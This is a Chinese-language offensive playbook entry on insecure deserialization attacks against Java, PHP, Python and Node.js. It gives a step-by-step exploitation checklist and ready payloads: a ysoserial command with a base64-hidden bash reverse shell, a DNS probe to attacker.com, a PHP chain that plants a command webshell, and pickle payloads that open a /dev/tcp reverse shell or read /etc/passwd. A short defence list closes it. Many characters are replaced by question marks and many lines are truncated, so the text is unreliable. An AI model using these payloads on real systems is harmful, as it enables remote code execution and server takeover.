# Insecure Deserialization Exploitation

**ID**: `web-deser-001` | **分类**: web | **风险等级**: critical

不安全反序列化允许攻击者通过构造恶意序列化数据，在反序列化过程中触发对象创建、方法调用和代码执行。每种语言和序列化格式都有特定的攻击向量：Java 通过 gadget chain 调用链实?RCE，PHP 通过 __wakeup/__destruct 魔术方法，Python 通过 pickle ?REDUCE 操作码，Node.js 通过原型链污染，YAML 通过语言特定类型标签。反序列化漏洞的核心在于反序列化过程会自动实例化对象并调用特定方法，攻击者构造的恶意数据可在这一过程中被执行

## 触发场景

- 应用接收序列化的对象数据（Cookie、Session、Token、API 请求体）
- Java 应用使用 ObjectInputStream.readObject() 反序列化用户可控数据
- PHP 应用使用 unserialize() 处理用户输入
- Python 应用使用 pickle.loads() 反序列化不可信数
- Node.js 应用反序列化 JSON 或其他格式数据时存在原型链操
- Ruby/Python YAML 解析器加载不可信 YAML 文档
- 存在基于序列化的 Remember Me、状态恢复、缓存功?

## 操作检查清单

1. 识别序列化格式（Java、PHP、Python、YAML?NET、Node.js
2. 确认序列化数据是否用户可控（Cookie、URL 参数、POST body、Header
3. 检查是否有完整性保护（签名、HMAC、加密）
4. Java：分析类路径，选择匹配?ysoserial gadget chain
5. PHP：审计源码寻找可利用的魔术方法链（POP chain
6. Python：检?pickle.loads() 调用
7. YAML：检查是否使?yaml.load() vs yaml.safe_load()
8. Node.js：检?JSON 反序列化后的对象是否?merge 到原型链
9. 生成恶意 payload 并测试反序列化结
10. 验证代码执行效果

## 技术手段

- Java ysoserial gadget chain（CommonsCollections、Spring、Jdk7u21 等）
- PHP POP chain（Property Oriented Programming）利用魔术方
- Python pickle REDUCE 操作码执行任意代
- Node.js 原型链污染（__proto__、constructor.prototype
- YAML !!python/object/!!ruby/object 类型标签利用
- .NET BinaryFormatter gadget chain（TypeConfuseDelegate 等）
- Base64 编码序列化数据绕过检
- 序列化数据篡改（修改字段值、类型、类名）
- Gadget chain 版本适配（根据目标库版本选择 chain
- 反序列化 + SSRF 组合利用

## 症状

- 应用使用序列化对象传输状态（Session、Token、Cookie
- 序列化数据可被用户修改且无完整性校验（如缺少签?HMAC
- 反序列化过程中出现类找不到或类型不匹配错
- 应用日志中出现异常的类加载或方法调用
- 响应时间异常（反序列化复?gadget chain 耗时增加?

## 根因分析

- 反序列化用户可控数据且未验证完整
- 序列化格式允许指定对象类型（攻击者可指定任意类）
- 类路径中存在可利用的 gadget（可被链式调用实?RCE 的类和方法）
- PHP 魔术方法（__wakeup、__destruct、__toString）在反序列化时自动调
- Python pickle 设计允许执行任意操作
- YAML 加载器支持语言特定类型?!python/object
- Node.js JSON.parse 后对象原型链被污染影响后续逻辑

## 示例

### Java 反序列化 - ysoserial CommonsCollections

利用 Apache CommonsCollections 库的 gadget chain 实现 Java RCE

```
前提: 目标类路径包?Apache CommonsCollections 库

生成 payload:
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" > payload.bin

常用 gadget chain:
CommonsCollections1-7  - 适用?CommonsCollections 3.x/4.x
Spring1, Spring2       - 适用?Spring 框架
Jdk7u21                - JDK 7u21 之前，无需外部依赖
JRE8u20                - JRE 8u20 之前，无需外部依赖
Hibernate1, Hibernate2 - 适用?Hibernate 框架
MyFaces1               - 适用?Apache MyFaces
ROME                   - 适用?ROME 库
URLDNS                 - DNS 检测（?RCE，仅验证）

发?payload:
1. 直接发送二进制数据（HTTP body、Cookie）
2. Base64 编码后发? base64 payload.bin | tr -d '\n'
3. URL 编码后作为参数发送

检?gadget 可用?
java -jar ysoserial.jar URLDNS http://attacker.com/ > detect.bin
发?detect.bin，收?DNS 查询说明可反序列化

工具: https://github.com/frohoff/ysoserial
     https://github.com/wh1t3p1g/ysoserial (更新版本)
```

### PHP unserialize() 魔术方法链利

利用 PHP 反序列化中的魔术方法（__wakeup、__destruct）执行代

```
PHP 序列化格?
O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:30;}
O:对象名长?"对象名":属性数?{属性定义}

PHP 魔术方法（反序列化时自动调用?
__wakeup()    - 反序列化完成后调用
__destruct()  - 对象销毁时调用
__toString()  - 对象被当作字符串使用时调用
__call()      - 调用不存在的方法时调用
__get()       - 访问不存在的属性时调用

POP Chain 示例:
class FileHandler {
    public $filename = '/var/www/html/shell.php';
    public $data = '<?php system($_GET["cmd"]); ?>';
    public function __destruct() {
        file_put_contents($this->filename, $this->data);
    }
}
$obj = new FileHandler();
echo serialize($obj);
// 输出: O:11:"FileHandler":2:{s:8:"filename";s:25:"/var/www/html/shell.php";s:4:"data";s:34:"<?php system($_GET[\"cmd\"]); ?>";}

PHP 7+ 反序列化模式:
unserialize($data, ['allowed_classes' => false])  // 禁止创建对象
unserialize($data, ['allowed_classes' => ['SafeClass']])  // 白名单

工具: https://github.com/ambionics/phpggc
```

### Python pickle.loads() 反序列化 RCE

利用 Python pickle 的反序列化机制执行任意代

```
Pickle 本质是一个小?VM，REDUCE 操作码可执行任意可调用对?

Payload 生成:
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',))

payload = pickle.dumps(Exploit())
print(payload)  # 发送此 payload 到目标

更通用?payload:
import pickle, base64, subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['id'],))

payload = base64.b64encode(pickle.dumps(RCE())).decode()

单行 payload (直接注入):
cos\nsystem\n(S'cat /etc/passwd'\ntR.\n解析: cos (导入 os 模块)
      system (获取 system 函数)
      (S'cmd'\ntR. (调用 system('cmd'))

Pickle 操作码说?
c - 导入模块
( - 标记元组开始
S - 字符串
t - 结束元组
R - 执行（REDUCE：调用函数）
. - 结束

注意: pickle 在任何情况下都不应用于不可信数据
替代方案: json、msgpack
```

### Node.js 原型链污染反序列

通过 JSON 反序列化污染 Object.prototype，影响后续代码逻辑

```
原型链污染原?
攻击者通过控制 JSON 数据中的 __proto__ ?constructor.prototype
污染所有对象的原型，影响后续的代码执行逻辑

基础污染:
JSON.parse('{"__proto__": {"isAdmin": true}}')
const user = {};
console.log(user.isAdmin);
```

## 成功标志

- DNS 查询日志确认（ysoserial URLDNS gadget）
- 反序列化错误暴露类路径信息
- 命令执行成功（反弹 shell、文件写入、系统命令输出）
- 时间延迟确认（sleep/ping 延迟测试）

## 防御建议

- 绝不反序列化不可信数据，这是最根本的防御原则
- 使用安全的序列化格式（如 JSON）替代语言特定的序列化格式
- Java：使用 SerialKiller 或 ObjectInputFilter 实现反序列化白名单
- PHP：使用 unserialize($data, ['allowed_classes' => false]) 禁止对象创建
- Python：使用 json 替代 pickle，或实现安全的 unpickler
- YAML：始终使用 yaml.safe_load() 替代 yaml.load()
- 对所有序列化数据附加 HMAC 签名，反序列化前验证完整性
